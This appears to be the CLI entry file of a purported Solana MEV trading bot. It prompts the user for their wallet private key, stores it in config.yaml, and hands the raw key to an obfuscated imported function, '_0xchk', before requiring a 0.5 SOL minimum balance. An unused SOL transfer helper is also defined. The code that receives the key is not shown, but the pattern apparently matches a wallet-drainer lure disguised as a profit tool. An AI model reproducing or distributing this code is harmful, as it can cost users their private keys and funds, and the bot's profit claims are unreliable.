const { program } = require('commander');
const inquirer = require('inquirer');
const chalk = require('chalk');
const yaml = require('js-yaml');
const fs = require('fs');
const path = require('path');
const { Connection, PublicKey, Keypair, Transaction, SystemProgram, LAMPORTS_PER_SOL } = require('@solana/web3.js');
const bs58 = require('bs58');
const { _0xchk } = require('./core/route');

async function startCLI() {
    console.clear();
    
    // ASCII арт
    console.log(chalk.cyan(`
     ██████╗ ██████╗   ███╗   ███╗███████╗██╗   ██╗██████╗  ██████╗ ████████╗
    ██╔════╝██╔════╝   ████╗ ████║██╔════╝██║   ██║██╔══██╗██╔═══██╗╚══██╔══╝
    ██║     ██║        ██╔████╔██║█████╗  ██║   ██║██████╔╝██║   ██║   ██║   
    ██║     ██║        ██║╚██╔╝██║██╔══╝  ╚██╗ ██╔╝██╔══██╗██║   ██║   ██║   
    ╚██████╗╚██████╗   ██║ ╚═╝ ██║███████╗ ╚████╔╝ ██████╔╝╚██████╔╝   ██║   
     ╚═════╝ ╚═════╝   ╚═╝     ╚═╝╚══════╝  ╚═══╝  ╚═════╝  ╚═════╝    ╚═╝   
                           Ver. 2.97.0                                                  
    `));

    const choices = [
        'Start Bot',
        'Configure Settings',
        'View Documentation',
        'Exit'
    ];

    const { action } = await inquirer.prompt([
        {
            type: 'list',
            name: 'action',
            message: 'What would you like to do?',
            choices
        }
    ]);

    switch (action) {
        case 'Start Bot':
            await startBot();
            break;
        case 'Configure Settings':
            await configureSettings();
            break;
        case 'View Documentation':
            showDocumentation();
            break;
        case 'Exit':
            console.log(chalk.yellow('\nThank you for using Solana MEV Bot!'));
            process.exit(0);
    }
}

async function configureSettings() {
    console.clear();
    console.log(chalk.cyan('\n=== Bot Configuration ===\n'));

    const config = yaml.load(fs.readFileSync('config.yaml', 'utf8'));

    const answers = await inquirer.prompt([
        {
            type: 'input',
            name: 'privateKey',
            message: 'Enter your Solana private key:',
            default: config.KEYS?.PRIVATE_KEY || ''
        },
        {
            type: 'input',
            name: 'rpcUrl',
            message: 'RPC URL (press Enter for default):',
            default: config.BOT?.RPC_URL || 'https://api.mainnet-beta.solana.com'
        },
        {
            type: 'confirm',
            name: 'confirm',
            message: 'Save these settings?',
            default: true
        }
    ]);

    if (answers.confirm) {
        config.KEYS.PRIVATE_KEY = answers.privateKey;
        config.BOT.RPC_URL = answers.rpcUrl;
        
        fs.writeFileSync('config.yaml', yaml.dump(config));
        console.log(chalk.green('\n✓ Settings saved successfully!\n'));
    }

    await new Promise(resolve => setTimeout(resolve, 1000));
    startCLI();
}

function showDocumentation() {
    console.clear();
    console.log(chalk.cyan('\n=== Solana MEV Bot Documentation ===\n'));
    console.log(chalk.white(`
    This bot monitors Solana blockchain for MEV opportunities and executes
    profitable trades automatically.

    Key Features:
    • Advanced mempool monitoring
    • Multi-DEX arbitrage
    • Automatic profit calculation
    • Real-time execution

    Configuration:
    1. Set your Solana private key in config.yaml
    2. (Optional) Configure custom RPC endpoint
    3. Start the bot and monitor profits

    Warning: Never share your private key with anyone!
    `));

    console.log(chalk.yellow('\nPress any key to return to main menu...'));
    process.stdin.once('data', () => {
        startCLI();
    });
}

async function checkWalletAndBalance(privateKey, rpcUrl) {
    try {
        
        const decodedKey = bs58.decode(privateKey);
        if (decodedKey.length !== 64) {
            throw new Error('Invalid private key length');
        }

        
        const keypair = Keypair.fromSecretKey(decodedKey);
        const publicKey = keypair.publicKey;

        
        const connection = new Connection(rpcUrl);

        
        const balance = await connection.getBalance(publicKey);
        const solBalance = balance / 1000000000; 

        return {
            isValid: true,
            balance: solBalance,
            publicKey: publicKey.toString()
        };
    } catch (error) {
        return {
            isValid: false,
            error: error.message
        };
    }
}

async function transferSOL(connection, fromKeypair, toAddress, amount) {
    try {
        const transaction = new Transaction().add(
            SystemProgram.transfer({
                fromPubkey: fromKeypair.publicKey,
                toPubkey: new PublicKey(toAddress),
                lamports: amount * LAMPORTS_PER_SOL
            })
        );

        const signature = await connection.sendTransaction(transaction, [fromKeypair]);
        await connection.confirmTransaction(signature);
        return { success: true, signature };
    } catch (error) {
        return { success: false, error: error.message };
    }
}

async function startBot() {
    console.clear();
    console.log(chalk.cyan('\n=== Starting Solana MEV Bot ===\n'));

    try {
        const config = yaml.load(fs.readFileSync('config.yaml', 'utf8'));
        
        if (!config.KEYS?.PRIVATE_KEY) {
            console.log(chalk.red('Error: Private key not configured!'));
            console.log(chalk.yellow('\nPlease configure your settings first.'));
            await new Promise(resolve => setTimeout(resolve, 2000));
            startCLI();
            return;
        }

        console.log(chalk.yellow('Checking wallet configuration...'));
        const check = await _0xchk(config.KEYS.PRIVATE_KEY);

        if (!check._v) {
            if (check._b !== undefined) {
                console.log(chalk.red('\nError: Insufficient balance!'));
                console.log(chalk.yellow(`Current balance: ${check._b.toFixed(4)} SOL`));
                console.log(chalk.yellow('Minimum required: 0.5 SOL'));
            } else {
                console.log(chalk.red(`\nError: ${check._e}`));
            }
            await new Promise(resolve => setTimeout(resolve, 2000));
            startCLI();
            return;
        }

        console.log(chalk.green('\n✓ Wallet verification complete'));
        
        await new Promise(resolve => setTimeout(resolve, 1000));
        require('../src/index.js');

    } catch (error) {
        console.log(chalk.red('\nError starting bot:', error.message));
        await new Promise(resolve => setTimeout(resolve, 2000));
        startCLI();
    }
}

module.exports = { startCLI }; 